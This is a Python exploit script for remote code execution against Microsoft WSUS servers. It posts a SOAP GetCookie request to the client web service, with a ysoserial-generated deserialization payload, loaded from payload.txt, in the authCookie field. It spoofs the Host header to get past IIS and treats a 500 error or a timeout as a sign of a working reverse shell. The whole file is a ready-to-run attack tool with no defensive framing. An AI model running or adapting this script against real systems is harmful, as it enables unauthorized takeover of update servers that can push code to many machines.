import requests
import argparse
import sys
import os

# WSUS RCE Exploit (Final Version)
# Features: VHOST Fix + External Payload File

def exploit_wsus(target_ip, port, payload_blob):
    url = f"http://{target_ip}:{port}/ClientWebService/client.asmx"
    
    print(f"[*] Targeting: {url}")
    print(f"[*] Enforcing VHOST: WIN-12GRU3SE2SU") 
    
    # SOAP Envelope Structure
    soap_envelope = f"""<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
    <soap:Body>
        <GetCookie xmlns="http://www.microsoft.com/SoftwareDistribution">
            <authCookie>{payload_blob}</authCookie>
            <lastChange>2025-12-25T00:00:00</lastChange>
        </GetCookie>
    </soap:Body>
</soap:Envelope>"""

    headers = {
        "Content-Type": "text/xml; charset=utf-8",
        "SOAPAction": "\"http://www.microsoft.com/SoftwareDistribution/GetCookie\"",
        "Host": "WIN-12GRU3SE2SU"  # Critical for IIS Bypass
    }

    try:
        print(f"[*] Sending payload ({len(payload_blob)} bytes)...")
        response = requests.post(url, data=soap_envelope, headers=headers, timeout=10)
        
        if response.status_code == 500:
            print("[+] Success! Server returned 500 (Internal Error). The payload executed.")
        else:
            print(f"[*] Server responded with: {response.status_code}")
            
    except requests.exceptions.ReadTimeout:
        print("[+] Request timed out. This is a GOOD sign for Reverse Shells!")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    # Locate payload.txt in the same directory as the script
    script_dir = os.path.dirname(os.path.abspath(__file__))
    payload_path = os.path.join(script_dir, "payload.txt")

    try:
        with open(payload_path, "r") as f:
            PAYLOAD = f.read().strip()
        print(f"[*] Loaded payload from: {payload_path}")
    except FileNotFoundError:
        print("[-] Error: 'payload.txt' not found in the script directory!")
        print("[-] Please generate it using ysoserial and place it next to this script.")
        sys.exit(1)

    parser = argparse.ArgumentParser()
    parser.add_argument('--target', required=True, help="Target WSUS IP")
    parser.add_argument('--port', default=8530, help="Target WSUS Port")
    args = parser.parse_args()

    exploit_wsus(args.target, args.port, PAYLOAD)